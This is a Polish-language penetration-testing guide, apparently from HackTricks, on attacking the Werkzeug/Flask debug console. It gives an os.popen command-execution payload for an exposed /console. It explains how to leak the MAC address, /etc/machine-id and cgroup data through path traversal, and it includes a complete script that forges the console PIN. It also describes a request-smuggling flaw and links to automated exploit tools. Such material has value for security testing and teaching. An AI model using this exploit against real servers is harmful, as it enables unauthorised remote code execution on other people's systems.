# Werkzeug / Flask Debug

{{#include ../../banners/hacktricks-training.md}}


## Console RCE

Jeśli debugowanie jest aktywne, możesz spróbować uzyskać dostęp do `/console` i zdobyć RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../images/image (117).png>)

Istnieje również kilka exploitów w internecie, takich jak [ten](https://github.com/its-arun/Werkzeug-Debug-RCE) lub jeden w metasploit.

## Pin Protected - Path Traversal

W niektórych przypadkach punkt końcowy **`/console`** będzie chroniony pinem. Jeśli masz **vulnerability** do przechodzenia po plikach, możesz wyciekować wszystkie niezbędne informacje do wygenerowania tego pinu.

### Werkzeug Console PIN Exploit

Wymuś stronę błędu debugowania w aplikacji, aby zobaczyć to:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Wiadomość dotycząca scenariusza "console locked" pojawia się podczas próby uzyskania dostępu do interfejsu debugowania Werkzeug, wskazując na konieczność podania PIN-u w celu odblokowania konsoli. Sugeruje się wykorzystanie PIN-u konsoli poprzez analizę algorytmu generowania PIN-u w pliku inicjalizacyjnym debugowania Werkzeug (`__init__.py`). Mechanizm generowania PIN-u można zbadać w [**repozytorium kodu źródłowego Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py), chociaż zaleca się pozyskanie rzeczywistego kodu serwera za pomocą luki w przejściu plików z powodu potencjalnych różnic w wersjach.

Aby wykorzystać PIN konsoli, potrzebne są dwa zestawy zmiennych: `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**

- **`username`**: Odnosi się do użytkownika, który zainicjował sesję Flask.
- **`modname`**: Zazwyczaj oznaczany jako `flask.app`.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Zwykle rozwiązuje się do **Flask**.
- **`getattr(mod, '__file__', None)`**: Reprezentuje pełną ścieżkę do `app.py` w katalogu Flask (np. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Jeśli `app.py` nie jest odpowiedni, **spróbuj `app.pyc`**.

#### **`private_bits`**

- **`uuid.getnode()`**: Pobiera adres MAC bieżącej maszyny, a `str(uuid.getnode())` przekształca go w format dziesiętny.

- Aby **określić adres MAC serwera**, należy zidentyfikować aktywny interfejs sieciowy używany przez aplikację (np. `ens3`). W przypadku niepewności, **wycieknij `/proc/net/arp`**, aby znaleźć identyfikator urządzenia, a następnie **wyodrębnij adres MAC** z **`/sys/class/net/<device id>/address`**.
- Konwersję adresu MAC w formacie szesnastkowym na dziesiętny można wykonać, jak pokazano poniżej:

```python
# Przykładowy adres MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```

- **`get_machine_id()`**: Łączy dane z `/etc/machine-id` lub `/proc/sys/kernel/random/boot_id` z pierwszą linią `/proc/self/cgroup` po ostatnim ukośniku (`/`).

<details>

<summary>Kod dla `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Po zebraniu wszystkich niezbędnych danych, skrypt exploitacyjny może zostać uruchomiony w celu wygenerowania PIN-u konsoli Werkzeug:

Po zebraniu wszystkich niezbędnych danych, skrypt exploitacyjny może zostać uruchomiony w celu wygenerowania PIN-u konsoli Werkzeug. Skrypt wykorzystuje zebrane `probably_public_bits` i `private_bits` do stworzenia hasha, który następnie przechodzi dalsze przetwarzanie w celu uzyskania ostatecznego PIN-u. Poniżej znajduje się kod Pythona do wykonania tego procesu:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ten skrypt generuje PIN, haszując połączone bity, dodając konkretne sole (`cookiesalt` i `pinsalt`) oraz formatując wynik. Ważne jest, aby rzeczywiste wartości dla `probably_public_bits` i `private_bits` były dokładnie uzyskane z systemu docelowego, aby zapewnić, że wygenerowany PIN odpowiada temu oczekiwanemu przez konsolę Werkzeug.

> [!TIP]
> Jeśli używasz **starej wersji** Werkzeug, spróbuj zmienić **algorytm haszowania na md5** zamiast sha1.

## Znaki Unicode w Werkzeug

Jak zauważono w [**tym zgłoszeniu**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug nie zamyka żądania z znakami Unicode w nagłówkach. Jak wyjaśniono w [**tym opracowaniu**](https://mizu.re/post/twisty-python), może to spowodować podatność na CL.0 Request Smuggling.

Dzieje się tak, ponieważ w Werkzeug możliwe jest wysyłanie niektórych **znaków Unicode**, co może spowodować **awarię** serwera. Jednak jeśli połączenie HTTP zostało utworzone z nagłówkiem **`Connection: keep-alive`**, ciało żądania nie zostanie odczytane, a połączenie pozostanie otwarte, więc **ciało** żądania będzie traktowane jako **następne żądanie HTTP**.

## Zautomatyzowane Wykorzystanie

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Odniesienia

- [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
- [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
- [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
- [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

{{#include ../../banners/hacktricks-training.md}}
